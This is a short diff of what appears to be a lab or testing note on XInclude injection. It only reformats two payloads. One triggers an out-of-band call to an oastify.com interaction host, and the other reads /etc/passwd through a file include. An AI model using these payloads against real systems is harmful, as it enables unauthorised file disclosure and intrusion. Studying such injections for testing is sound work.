@@ -23,9 +23,9 @@ repeater
 <br><br>
 
 origin payload: 
-<zyk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://c1e413cu8m75q33nafwztiesjjpad01p.oastify.com/foo"/></zyk>
+```<zyk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://c1e413cu8m75q33nafwztiesjjpad01p.oastify.com/foo"/></zyk>```
 
 win payload:
-<zyk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd/"/></zyk>
+```<zyk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd/"/></zyk>```
 
 <img width="827" height="528" alt="image" src="https://github.com/user-attachments/assets/70018d9a-e786-4361-acad-2742040ce783" />
